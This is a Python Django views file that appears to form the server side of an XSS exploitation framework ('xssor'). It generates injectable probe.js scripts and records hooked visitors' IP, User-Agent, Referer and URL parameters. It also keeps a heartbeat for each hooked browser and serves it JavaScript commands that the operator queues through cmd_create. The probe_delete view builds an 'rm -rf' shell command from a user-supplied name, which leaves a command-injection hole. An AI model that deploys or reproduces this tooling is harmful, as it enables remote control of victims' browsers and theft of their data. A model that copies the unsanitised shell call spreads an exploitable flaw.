import os
import glob
import time
import hashlib
import simplejson

from django.shortcuts import render
from django.http import HttpResponse

BASEDIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))    
PROBEDIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'probe')

def now_time():
    """2037-03-07 13:30:07"""
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

def to_time(timestr):
    """2037-03-07 13:30:07 -> 2120063407.0"""
    try:
        timestr = str(timestr)
        t=time.strptime(timestr,'%Y-%m-%d %H:%M:%S')
        return time.mktime(t)
    except:
        return time.time()

def __getpid(ip):
    abcdef = 'abcdefghijklmnopqrstuvwxyz'
    fedcba = 'zyawvubsrjponmlkqihgfedctx'
    h1 = hashlib.md5('<%s>'%ip).hexdigest()
    h2 = hashlib.md5('</%s>'%h1).hexdigest()
    h = h1 + h2
    j = 0
    adict = {}
    for i in h:
        if not i.isalpha():
            continue
        if j >= 26:
            adict[j-26] = i
        else:
            adict[j] = i
        j += 1
    a = []
    for j in adict:
        pos = abcdef.index(adict[j]) + j
        if pos >= 26:
            pos = pos - 26
        a.append(fedcba[pos])
    s1 = ''.join(a)
    if len(s1) >= 7:
        s2 = s1[:7]
    else:
        s2 = s1.ljust(7, s1[0])
    return s2

def __reqisok(req):
    ua = req.META.get('HTTP_USER_AGENT', '')
    pid = req.POST.get('pid', '')
    if not pid:
        pid = req.GET.get('pid', '')
    if not pid or not pid.isalpha() or len(pid) != 7 or not ua:
        return 0
    return 1

def __status(req):
    ip = req.META.get('REMOTE_ADDR','')
    pid = __getpid(ip)
    IPBaseDir = os.path.join(PROBEDIR, pid)
    if not os.path.exists(IPBaseDir):
        os.mkdir(IPBaseDir)
    allProbesName = os.listdir(IPBaseDir)
    allprobes = []
    for p in allProbesName:
        probe = {}
        probe['name'] = p
        pdir = os.path.join(IPBaseDir, p)
        probe_js = os.path.join(pdir, '%s.js'%p)
        probe_txt = os.path.join(pdir, '%s.txt'%p)
        probe_cmd = os.path.join(pdir, '%s.cmd'%p)
        probe_heartbeet = os.path.join(pdir, '%s.heartbeet'%p)
        
        probe['probe_existed'] = 0
        if os.path.exists(probe_js):
            probe['probe_existed'] = 1
        
        probe['probe_done'] = 0
        if os.path.exists(probe_txt):
            probe['probe_done'] = 1

        probe['probe_live'] = 0
        try:
            f = open(probe_heartbeet)
            c = f.read()
            f.close()
        except:
            c = ''
        if c:
            if(time.time() - to_time(c) <= 15):
                probe['probe_live'] = 1

        probe['probe_cmd_c'] = ''
        try:
            f = open(probe_cmd)
            c = f.read()
            f.close()
        except:
            c = ''
        if c:
            probe['probe_cmd_c'] = c
        allprobes.append(probe)
    hasProbes = 0
    if len(allprobes) > 0:
        hasProbes = 1
    return {
        'pid': pid,
        'allprobes': allprobes,
        'hasProbes': hasProbes
    }

def index(req):
    return render(req, 'index.html', __status(req))

def probe_status(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'Probe status fetched failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'Probe status fetched failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    probeName = req.POST.get('probeName', '')

    rnt = {'succ': 1, 'msg': 'Probe status fetched success.'}
    tmp = __status(req).get('allprobes')
    for i in tmp:
        if i.get('name') == probeName:
            tmp = i
            break
    rnt.update(tmp)
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def cmd_create(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'CMD created failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'CMD created failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    probeName = req.POST.get('probeName', '')
    curProbeDir = os.path.join(os.path.join(PROBEDIR, pid1), probeName)
    if not os.path.exists(curProbeDir):
        os.mkdir(curProbeDir)
    
    c = req.POST.get('cmd', '')
    curCmd = os.path.join(curProbeDir, '%s.cmd'%probeName)
    f = open(curCmd, 'w')
    f.write(c)
    f.close()

    rnt = {'succ': 1, 'msg': 'CMD created success. Just wait for some seconds.'}
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def cmd(req):
    if not __reqisok(req):
        resp = HttpResponse('alert("DO NOT BE BAD.");', content_type='application/x-javascript')
        return resp
    
    ip = req.META.get('REMOTE_ADDR','')
    ua = req.META.get('HTTP_USER_AGENT','-')
    referer = req.META.get('HTTP_REFERER','-')
    getdict = req.GET.dict()
    getstr = str(getdict)
    pid = getdict.get('pid', '')
    probeName = getdict.get('probeName', '')
    curProbeDir = os.path.join(os.path.join(PROBEDIR, pid), probeName)
    probe_txt = os.path.join(curProbeDir, '%s.txt'%probeName)
    probe_js = os.path.join(curProbeDir, '%s.js'%probeName)
    
    if not os.path.exists(probe_js):
        r = 'alert(/DO NOT BE BAD/);' + probe_js    
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
        
    if not os.path.exists(probe_txt):
        c = "IP: %s\nUser-Agent: %s\nReferer: %s\n%s\n\n"%(ip, ua, referer, getstr)
        try:
            f = open(probe_txt, 'w')
            f.write(c)
            f.close()
        except:
            r = 'xssor.done=0;'
            resp = HttpResponse(r, content_type='application/x-javascript')
            return resp
        r = 'xssor.done=1;'
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
    else:
        probe_heartbeet = os.path.join(curProbeDir, '%s.heartbeet'%probeName)
        try:
            f = open(probe_heartbeet, 'w')
            f.write(now_time())
            f.close()
        except:
            pass
        
        probe_cmd = os.path.join(curProbeDir, '%s.cmd'%probeName)
        try:
            f = open(probe_cmd)
            c = f.read().strip()
            f.close()
        except:
            c = '' 
        try:
            if c:
                f = open(probe_cmd, 'w') # wipe
                f.write('')
                f.close()
        except:
            pass
        if not c:
            c = 'xssor.heartbeet=1;' 
        
        r = c
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp

def probe_create(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'Probe created failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'Probe created failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    probeName = req.POST.get('probeName', '')
    curProbeDir = os.path.join(os.path.join(PROBEDIR, pid1), probeName)
    if not os.path.exists(curProbeDir):
        os.mkdir(curProbeDir)
    curProbe = os.path.join(curProbeDir, '%s.js'%probeName)
    f = open(os.path.join(BASEDIR, 'payload/probe.js'))
    c = f.read()
    f.close()
    c = c.replace('abcdefg', pid1)
    c = c.replace('hijklmnopq', probeName)
    f = open(curProbe, 'w')
    f.write(c)
    f.close()

    rnt = {'succ': 1, 'msg': 'Probe created success. Probe %s.js'%probeName}
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def probe_js(req, pid, probeName):
    curProbeDir = os.path.join(os.path.join(PROBEDIR, pid), probeName)
    # probe_txt = os.path.join(curProbeDir, '%s.txt'%probeName)
    # if os.path.exists(probe_txt):
    #     r = 'xssorsay="One time per day, u can try again tomorrow.";'
    #     resp = HttpResponse(r, content_type='application/x-javascript')
    #     return resp
    try:
        f = open(os.path.join(curProbeDir, '%s.js'%probeName))
        c = f.read()
        f.close()
    except:
        c = 'alert(/DO NOT BE BAD/);'
    resp = HttpResponse(c, content_type='application/x-javascript')
    return resp
    
def probe_txt(req, pid, probeName):
    curProbeDir = os.path.join(os.path.join(PROBEDIR, pid), probeName)
    try:
        f = open(os.path.join(curProbeDir, '%s.txt'%probeName))
        c = f.read()
        f.close()
    except:
        c = '-'
    resp = HttpResponse(c, content_type='text/plain')
    return resp
    
def probe_delete(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'Probe delete failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'Probe delete failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    probeName = req.POST.get('probeName', '')
    curProbeDir = os.path.join(os.path.join(PROBEDIR, pid1), probeName)
    if os.path.exists(curProbeDir):
        os.system("rm -rf %s"%curProbeDir)
    rnt = {'succ': 1, 'msg': 'Probe delete success. Probe %s.js'%probeName}
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def haha(req):
    return render(req, 'haha.html')